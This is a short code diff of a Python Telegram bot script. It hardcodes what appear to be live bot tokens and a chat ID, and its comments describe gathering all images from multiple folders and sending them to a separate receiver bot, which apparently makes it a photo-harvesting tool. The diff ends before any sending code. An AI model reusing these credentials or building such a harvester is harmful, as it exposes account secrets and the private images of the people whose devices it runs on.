@@ -1,12 +1,13 @@
-import os
 import glob
-from telegram import Update, InputFile, Bot as TelegramBot
+import os
+
+from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # 🔒 CONFIG
 BOT_TOKEN = "9167267835:AAFEK2RBJsrvAphApG1u0FUSypdMpN71kKY"          # Sender bot
 RECEIVER_BOT_TOKEN = "9032779142:AAE_wDt41G7NcfIuvYzKvUd0jzFSWGPQLq4"  # Receiver bot
-RECEIVER_CHAT_ID = "8688379018"                                       # Chat/User ID to receive images
+RECEIVER_CHAT_ID = "9032779142"                                       # Chat/User ID to receive images
 
 # ✅ Function: Get all images from multiple folders
 def get_all_images():
